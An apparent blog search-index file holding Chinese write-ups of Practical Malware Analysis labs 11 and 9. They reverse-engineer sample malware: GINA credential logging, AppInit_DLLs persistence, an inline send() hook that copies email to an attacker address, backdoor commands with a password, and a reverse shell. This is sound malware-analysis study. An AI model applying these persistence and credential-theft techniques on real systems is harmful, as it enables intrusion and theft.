<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>恶意代码分析实战-实验11</title>
    <link href="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/"/>
    <url>/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/</url>
    
    <content type="html"><![CDATA[<h2 id="Lab-11-1"><a href="#Lab-11-1" class="headerlink" title="Lab 11-1"></a>Lab 11-1</h2><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><p>使用火绒剑监控行为，可以看到其向当前的目录下释放了一个Dll文件。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/1-1.png"></p><p>IDA查看，可以看到很明显的从资源节中释放文件</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/1-2.png"></p><p>之后会进行注册表的相关操作。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/1-3.png"></p><p>可以看到在HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon下创建了一个键值GinaDLL，值是释放的DLL的路径。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/1-4.png"></p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/1-5.png"></p><p>打开DLL文件，查看其导出表，可以看到大量的Wlx开头的函数，由此可以判断出这是一个GINA拦截，窃取用户登录凭证。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/1-6.png"></p><p>通过查看字符串可以看到一个msutil32.sys，仔细查看发现，是创建此文件，然后向其中写一些数据，写入的数据是什么需要继续往外分析，查看传入的参数。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/1-7.png"></p><p>可以看到写入的数据，是一个结构体的相关信息。而这就是登录账户的信息。</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">typedef struct _WLX_MPR_NOTIFY_INFO &#123;<br>  PWSTR pszUserName;<span class="hljs-regexp">//</span>登录账户名称<br>  PWSTR pszDomain;<span class="hljs-regexp">//</span>登录域名称<br>  PWSTR pszPassword;<span class="hljs-regexp">//</span>密码<br>  PWSTR pszOldPassword;<span class="hljs-regexp">//</span>旧密码<br>&#125; WLX_MPR_NOTIFY_INFO, *PWLX_MPR_NOTIFY_INFO;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/1-8.png"></p><h3 id="1-这个恶意代码向磁盘释放了什么？"><a href="#1-这个恶意代码向磁盘释放了什么？" class="headerlink" title="1.这个恶意代码向磁盘释放了什么？"></a>1.这个恶意代码向磁盘释放了什么？</h3><p>释放了一个msgina32.dll文件。</p><h3 id="2-这个恶意代码如何进行驻留？"><a href="#2-这个恶意代码如何进行驻留？" class="headerlink" title="2.这个恶意代码如何进行驻留？"></a>2.这个恶意代码如何进行驻留？</h3><p>设置注册表，成为winlogon的一员。</p><h3 id="3-这个恶意代码如何窃取用户登录凭证？"><a href="#3-这个恶意代码如何窃取用户登录凭证？" class="headerlink" title="3.这个恶意代码如何窃取用户登录凭证？"></a>3.这个恶意代码如何窃取用户登录凭证？</h3><p>GINA拦截用户登录信息</p><h3 id="4-这个恶意代码对窃取的证书做了什么处理？"><a href="#4-这个恶意代码对窃取的证书做了什么处理？" class="headerlink" title="4.这个恶意代码对窃取的证书做了什么处理？"></a>4.这个恶意代码对窃取的证书做了什么处理？</h3><p>将其保存到msutil32.sys文件中。</p><h3 id="5-如何在你的测试环境下让这个恶意代码获得用户凭证？"><a href="#5-如何在你的测试环境下让这个恶意代码获得用户凭证？" class="headerlink" title="5.如何在你的测试环境下让这个恶意代码获得用户凭证？"></a>5.如何在你的测试环境下让这个恶意代码获得用户凭证？</h3><p>需要先重启，启动拦截，然后注销系统，再次登录时，信息就会被记录。</p><h2 id="Lab-11-2"><a href="#Lab-11-2" class="headerlink" title="Lab 11-2"></a>Lab 11-2</h2><h3 id="详细分析-1"><a href="#详细分析-1" class="headerlink" title="详细分析"></a>详细分析</h3><p>使用IDA打开DLL，看到DLL main函数。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-1.png"></p><p>首先会尝试打开C:\Windows\system32\Lab11-02.ini这个文件，可以看到模式是打开存在的文件</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-2.png"></p><p>然后会读取文件中的数据，这是读取到的数据。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-3.png"></p><p>解密算法，解密出数据<a href="mailto:&#x62;&#x69;&#x6c;&#x6c;&#121;&#64;&#x6d;&#x61;&#x6c;&#119;&#97;&#114;&#101;&#97;&#110;&#x61;&#108;&#x79;&#115;&#105;&#115;&#98;&#111;&#x6f;&#107;&#46;&#x63;&#111;&#x6d;">&#x62;&#x69;&#x6c;&#x6c;&#121;&#64;&#x6d;&#x61;&#x6c;&#119;&#97;&#114;&#101;&#97;&#110;&#x61;&#108;&#x79;&#115;&#105;&#115;&#98;&#111;&#x6f;&#107;&#46;&#x63;&#111;&#x6d;</a>，是一个邮箱地址。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-4.png"></p><p>然后会进行比较当前运行的是否是THEBAT.EXE、OUTLOOK.EXE、MSIMN.EXE这三个程序，如果是的话会执行下面的三个函数</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-5.png"></p><p>之后会获取send函数的地址，来进行inline hook</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-6.png"></p><p>HOOK函数，关于inline hook的相关知识可以查看这里，<a href="https://b1ackie.cn/2021/07/28/HOOK-Inline%20Hook/">inline hook</a></p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-7.png"></p><p>inline hook前</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-8.png"></p><p>inline hook后</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-9.png"></p><p>查看HOOK后的jmp地址，这个函数检测send中发送的数据如果含有RCPT TO:，会加入一个新的RCPT TO: <a href="mailto:&#x62;&#x69;&#x6c;&#x6c;&#121;&#64;&#x6d;&#97;&#108;&#x77;&#97;&#114;&#101;&#x61;&#x6e;&#97;&#108;&#x79;&#115;&#105;&#x73;&#x62;&#111;&#x6f;&#107;&#46;&#99;&#111;&#109;">&#x62;&#x69;&#x6c;&#x6c;&#121;&#64;&#x6d;&#97;&#108;&#x77;&#97;&#114;&#101;&#x61;&#x6e;&#97;&#108;&#x79;&#115;&#105;&#x73;&#x62;&#111;&#x6f;&#107;&#46;&#99;&#111;&#109;</a>，RCPT TO是收件人的意思，也就是发送的所有邮件都会被发送到恶意的邮箱去。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-11.png"></p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-12.png"></p><p>DLL还有一个导出函数install，可以看到是设置了一个键值。分析是在HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows下的AppInit_DLLs中设置了spoolvxx32.dll，这个键值的作用是当前所有加载user32.dll的程序都会再次加载此键值中的dll。之后会将自身复制到system32目录下。</p><p>但是实际测试中发现并没有实现，原因是在XP中这样可以实现，而在win7中不行。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-13.png"></p><p>win7需要按照如图中设置，即可实现DLL的注入。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-14.png"></p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-15.png"></p><h3 id="1-这个恶意DLL导出了什么？"><a href="#1-这个恶意DLL导出了什么？" class="headerlink" title="1.这个恶意DLL导出了什么？"></a>1.这个恶意DLL导出了什么？</h3><p>导出了一个install函数</p><h3 id="2-使用rundll32-exe安装这个恶意代码后，发生了什么？"><a href="#2-使用rundll32-exe安装这个恶意代码后，发生了什么？" class="headerlink" title="2.使用rundll32.exe安装这个恶意代码后，发生了什么？"></a>2.使用rundll32.exe安装这个恶意代码后，发生了什么？</h3><p>会将自身复制到system32目录下，还会设置HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows下的AppInit_DLLs，这会实现DLL的注入。</p><h3 id="3-为了使这个恶意代码正确安装，Lab11-02-ini必须放置在何处？"><a href="#3-为了使这个恶意代码正确安装，Lab11-02-ini必须放置在何处？" class="headerlink" title="3.为了使这个恶意代码正确安装，Lab11-02.ini必须放置在何处？"></a>3.为了使这个恶意代码正确安装，Lab11-02.ini必须放置在何处？</h3><p>根据上面分析可知必须放在system32目录下。</p><h3 id="4-这个安装的恶意代码如何驻留？"><a href="#4-这个安装的恶意代码如何驻留？" class="headerlink" title="4.这个安装的恶意代码如何驻留？"></a>4.这个安装的恶意代码如何驻留？</h3><p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows下的AppInit_DLLs在这个键值中写入DLL的路径，可以实现持久化驻留。</p><h3 id="5-这个恶意代码采用的用户态Rootkit技术是什么？"><a href="#5-这个恶意代码采用的用户态Rootkit技术是什么？" class="headerlink" title="5.这个恶意代码采用的用户态Rootkit技术是什么？"></a>5.这个恶意代码采用的用户态Rootkit技术是什么？</h3><p>inline hook</p><h3 id="6-挂钩代码做了什么？"><a href="#6-挂钩代码做了什么？" class="headerlink" title="6.挂钩代码做了什么？"></a>6.挂钩代码做了什么？</h3><p>修改了send函数，所有向外发送包含RCPT TO：几个字符的邮件会被额外添加一行，发送给恶意账户。</p><h3 id="7-哪个或者哪些进程执行了这个恶意攻击，为什么？"><a href="#7-哪个或者哪些进程执行了这个恶意攻击，为什么？" class="headerlink" title="7.哪个或者哪些进程执行了这个恶意攻击，为什么？"></a>7.哪个或者哪些进程执行了这个恶意攻击，为什么？</h3><p>THEBAT.EXE、OUTLOOK.EXE、MSIMN.EXE，查询发现，它们都是邮件进程</p><h3 id="8-ini文件的意义是什么？"><a href="#8-ini文件的意义是什么？" class="headerlink" title="8..ini文件的意义是什么？"></a>8..ini文件的意义是什么？</h3><p>存储机密过后的恶意电子邮件地址，用来读取解密。</p><h3 id="9-你怎样用wireshark动态抓取这个恶意代码的行为？"><a href="#9-你怎样用wireshark动态抓取这个恶意代码的行为？" class="headerlink" title="9.你怎样用wireshark动态抓取这个恶意代码的行为？"></a>9.你怎样用wireshark动态抓取这个恶意代码的行为？</h3><p>可以查看与邮件相关的数据包来进行分析。</p>]]></content>
    
    
    <categories>
      
      <category>恶意代码分析实战</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>病毒分析</tag>
      
      <tag>Lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>恶意代码分析实战-实验9</title>
    <link href="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/"/>
    <url>/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/</url>
    
    <content type="html"><![CDATA[<h2 id="Lab-9-1"><a href="#Lab-9-1" class="headerlink" title="Lab 9-1"></a>Lab 9-1</h2><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><p>打开程序，首先看到判断当前程序是否带了参数，如果带了参数，就进行后面的操作，如果没有带参数，会尝试打开一个键值，如果不存在此键值，则程序自删除，如果存在就会开始和服务器端通信，这些后面再说。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.1.png"></p><p>之后会进行判断，首先判断当前输入的最后一个参数是否等于abcd。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.2.png"></p><p>然后就是判断输入的第一个参数是什么，-in,-re,-c,-cc。</p><h4 id="in"><a href="#in" class="headerlink" title="-in"></a>-in</h4><p>-in参数，首先创建了一个系统服务</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.3.png"></p><p>然后将自身复制到system32下</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.4.png"></p><p>然后创建注册表表项，并且设置键值</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.5.png"></p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.6.png"></p><p>恶意代码安装的服务</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.7.png"></p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.8.png"></p><p>设置的键值</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.12.png"></p><h4 id="re"><a href="#re" class="headerlink" title="-re"></a>-re</h4><p>-re参数是删除配置信息，将服务删除，复制的文件删除，注册表信息也清空。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.9.png"></p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.10.png"></p><p>刚才创建的键值已经被删除</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.11.png"></p><h4 id="c"><a href="#c" class="headerlink" title="-c"></a>-c</h4><p>-c参数是设置自己的配置信息，根据-c后面的四个参数进行设置</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.13.png"></p><p>输入1 2 3 4</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.14.png"></p><h4 id="cc"><a href="#cc" class="headerlink" title="-cc"></a>-cc</h4><p>-cc 是打印当前的配置信息</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.15.png"></p><p>打印出来的信息</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.16.png"></p><p>如果参数不符合要求都会进行自删除</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.17.png"></p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.18.png"></p><h4 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h4><p>不带任何参数，且有配置信息的情况下，会执行连接服务器，并且根据服务器指令执行操作。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.19.png"></p><p>获取注册表中的配置信息</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.20.png"></p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.21.png"></p><p>指令共有五种，分别是sleep，upload，download，CMD，nothing</p><h5 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h5><p>会执行sleep函数</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.22.png"></p><h5 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h5><p>是下载一个文件</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.23.png"></p><h5 id="download"><a href="#download" class="headerlink" title="download"></a>download</h5><p>发送内容</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.24.png"></p><h5 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h5><p>会执行一个命令</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.25.png"></p><h5 id="nothing"><a href="#nothing" class="headerlink" title="nothing"></a>nothing</h5><p>什么都不做</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.26.png"></p><h3 id="1-如何让这个恶意代码安装自身？"><a href="#1-如何让这个恶意代码安装自身？" class="headerlink" title="1.如何让这个恶意代码安装自身？"></a>1.如何让这个恶意代码安装自身？</h3><p>从上数分析可以知道，需要使用-in选项。</p><h3 id="2-这个恶意代码的命令行选项是什么？它要求的密码是什么？"><a href="#2-这个恶意代码的命令行选项是什么？它要求的密码是什么？" class="headerlink" title="2.这个恶意代码的命令行选项是什么？它要求的密码是什么？"></a>2.这个恶意代码的命令行选项是什么？它要求的密码是什么？</h3><p>命令行选项有四种,-in,-re,-c,-cc密码是abcd</p><h3 id="3-如何利用OD永久修补这个恶意代码，使其不需要指定的命令行密码"><a href="#3-如何利用OD永久修补这个恶意代码，使其不需要指定的命令行密码" class="headerlink" title="3.如何利用OD永久修补这个恶意代码，使其不需要指定的命令行密码"></a>3.如何利用OD永久修补这个恶意代码，使其不需要指定的命令行密码</h3><p>修改跳转条件即可，这只是其中的一种方法，将JNZ修改为JMP。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.27.png"></p><h3 id="4-这个恶意代码基于系统的特征是什么？"><a href="#4-这个恶意代码基于系统的特征是什么？" class="headerlink" title="4.这个恶意代码基于系统的特征是什么？"></a>4.这个恶意代码基于系统的特征是什么？</h3><p>本地创建的名为Lab9-01的服务，还创建了一个XPS表项，其中的键值是连接所需的参数。</p><h3 id="5-这个恶意代码通过网络命令执行了哪些不同操作？"><a href="#5-这个恶意代码通过网络命令执行了哪些不同操作？" class="headerlink" title="5.这个恶意代码通过网络命令执行了哪些不同操作？"></a>5.这个恶意代码通过网络命令执行了哪些不同操作？</h3><p>上述分析已经分析清楚。</p><h3 id="6-这个恶意代码是否有网络特征？"><a href="#6-这个恶意代码是否有网络特征？" class="headerlink" title="6.这个恶意代码是否有网络特征？"></a>6.这个恶意代码是否有网络特征？</h3><p>有网络的连接，域名是<a href="http://www.practicalmalwareanalysis.com/">http://www.practicalmalwareanalysis.com</a></p><h2 id="Lab-9-2"><a href="#Lab-9-2" class="headerlink" title="Lab 9-2"></a>Lab 9-2</h2><h3 id="详细分析-1"><a href="#详细分析-1" class="headerlink" title="详细分析"></a>详细分析</h3><p>程序的整体流程比较简单。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-2.1.png"></p><p>首先程序会进行比较，比较当前运行的程序是否是ocl.exe</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-2.2.png"></p><p>然后会在401089函数中进行解密，是一个异或解密。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-2.3.png"></p><p>解密后的域名</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-2.4.png"></p><p>之后会连接域名，然后会调用401000，在其中创建了一个进程</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-2.5.png"></p><h3 id="1-在二进制文件中，你看到的静态字符串是什么？"><a href="#1-在二进制文件中，你看到的静态字符串是什么？" class="headerlink" title="1.在二进制文件中，你看到的静态字符串是什么？"></a>1.在二进制文件中，你看到的静态字符串是什么？</h3><p>只能看到这些字符串</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-2.6.png"></p><h3 id="2-当你运行这个二进制文件时，会发生什么？"><a href="#2-当你运行这个二进制文件时，会发生什么？" class="headerlink" title="2.当你运行这个二进制文件时，会发生什么？"></a>2.当你运行这个二进制文件时，会发生什么？</h3><p>不会发生什么，应该是会创建一个CMD进程。</p><h3 id="3-怎样让恶意代码的攻击负载（payload）获得运行？"><a href="#3-怎样让恶意代码的攻击负载（payload）获得运行？" class="headerlink" title="3.怎样让恶意代码的攻击负载（payload）获得运行？"></a>3.怎样让恶意代码的攻击负载（payload）获得运行？</h3><p>将名字改为ocl.exe</p><h3 id="4-在地址0x00401133处发生了什么？"><a href="#4-在地址0x00401133处发生了什么？" class="headerlink" title="4.在地址0x00401133处发生了什么？"></a>4.在地址0x00401133处发生了什么？</h3><p>将一些数据赋值给一个地址，主要是为了隐藏字符串，这也是为什么刚才字符串窗口并没有什么有用的信息，shellcode的编写手法之一，可以参考<a href="https://b1ackie.cn/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/">shellcode学习 </a></p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-2.7.png"></p><h3 id="5-传递个子例程（函数）0x00401089的参数是什么？"><a href="#5-传递个子例程（函数）0x00401089的参数是什么？" class="headerlink" title="5.传递个子例程（函数）0x00401089的参数是什么？"></a>5.传递个子例程（函数）0x00401089的参数是什么？</h3><p>是这两个参数，其中一个是加密的字符串</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-2.8.png"></p><p>另一个是用来进行异或解密的数据</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-2.9.png"></p><h3 id="6-恶意代码使用的域名是什么？"><a href="#6-恶意代码使用的域名是什么？" class="headerlink" title="6.恶意代码使用的域名是什么？"></a>6.恶意代码使用的域名是什么？</h3><p><a href="http://www.practicalmalwareanalysis.com/">www.practicalmalwareanalysis.com</a></p><h3 id="7-恶意代码使用什么编码函数来混淆域名？"><a href="#7-恶意代码使用什么编码函数来混淆域名？" class="headerlink" title="7.恶意代码使用什么编码函数来混淆域名？"></a>7.恶意代码使用什么编码函数来混淆域名？</h3><p>异或</p><h3 id="8-恶意代码在0x0040106E处调用CreateProcessA函数的意义是什么？"><a href="#8-恶意代码在0x0040106E处调用CreateProcessA函数的意义是什么？" class="headerlink" title="8.恶意代码在0x0040106E处调用CreateProcessA函数的意义是什么？"></a>8.恶意代码在0x0040106E处调用CreateProcessA函数的意义是什么？</h3><p>这块用书上的话来说是一个反向的SHELL，</p><p>书上的原话：</p><figure class="highlight dos"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dos">STARTUPINFO结构中的标准流被设置为一个套接字。这直接绑定套接字和<span class="hljs-built_in">cmd</span>.exe的标准流，所以<span 